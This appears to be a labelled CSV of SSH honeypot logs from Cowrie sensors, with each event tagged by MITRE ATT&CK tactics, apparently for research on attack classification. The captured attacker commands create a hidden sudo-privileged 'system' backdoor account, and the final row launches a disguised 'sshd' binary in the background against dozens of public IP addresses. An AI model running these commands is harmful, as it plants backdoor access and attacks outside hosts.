,event,session_id,session,labels
10,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:5173 (10.42.6.15:2222) [session: cff13ac1335f]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 5173.0, ""timestamp"": ""2025-08-10T11:46:20.638893Z"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
11,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T11:46:20.640298Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
12,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T11:46:20.660041Z"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
13,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T11:46:20.723130Z"", ""username"": ""root"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
14,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T11:46:20.807216Z"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
15,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T11:46:20.808409Z"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
16,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 VUKpBpHB"", ""message"": ""CMD: openssl passwd -1 VUKpBpHB"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T11:46:20.809247Z"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
17,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 VUKpBpHB"", ""message"": ""Command not found: openssl passwd -1 VUKpBpHB"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T11:46:20.810488Z"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
18,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/7b6b0388369d162075afed54643ff9ab87e15269d0d87ed548873527f96f06ee after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""7b6b0388369d162075afed54643ff9ab87e15269d0d87ed548873527f96f06ee"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T11:46:20.830838Z"", ""ttylog"": ""var/lib/cowrie/tty/7b6b0388369d162075afed54643ff9ab87e15269d0d87ed548873527f96f06ee"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
19,"{""duration"": ""0.2"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-10T11:46:20.831710Z"", ""session_id"": ""cff13ac1335f""}",cff13ac1335f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 VUKpBpHB) system  && sudo usermod -aG sudo system ; openssl passwd -1 VUKpBpHB;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
20,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:52868 (10.42.4.33:2222) [session: 519dc0f5224d]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 52868.0, ""timestamp"": ""2025-08-07T09:05:21.976772Z"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
21,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T09:05:21.977467Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
22,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T09:05:22.080950Z"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
23,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T09:05:22.393714Z"", ""username"": ""root"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
24,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T09:05:22.653808Z"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
25,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T09:05:22.654164Z"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
26,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 Qs2VMux5"", ""message"": ""CMD: openssl passwd -1 Qs2VMux5"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T09:05:22.689639Z"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
27,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 Qs2VMux5"", ""message"": ""Command not found: openssl passwd -1 Qs2VMux5"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T09:05:22.690497Z"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
28,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/a8e264af2eacca2d040695940f179f6f9312e0209de6f3ae636a2717b8a941b1 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""a8e264af2eacca2d040695940f179f6f9312e0209de6f3ae636a2717b8a941b1"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T09:05:22.795320Z"", ""ttylog"": ""var/lib/cowrie/tty/a8e264af2eacca2d040695940f179f6f9312e0209de6f3ae636a2717b8a941b1"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
29,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-07T09:05:22.796274Z"", ""session_id"": ""519dc0f5224d""}",519dc0f5224d,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 Qs2VMux5) system  && sudo usermod -aG sudo system ; openssl passwd -1 Qs2VMux5;,"['Impact', 'Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
30,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:32577 (10.42.4.33:2222) [session: e5166da5ed5e]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 32577.0, ""timestamp"": ""2025-08-05T21:00:46.468917Z"", ""session_id"": ""e5166da5ed5e""}",e5166da5ed5e,chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &;,"['Execution', 'Initial Access', 'Privilege Escalation', 'Persistence']"
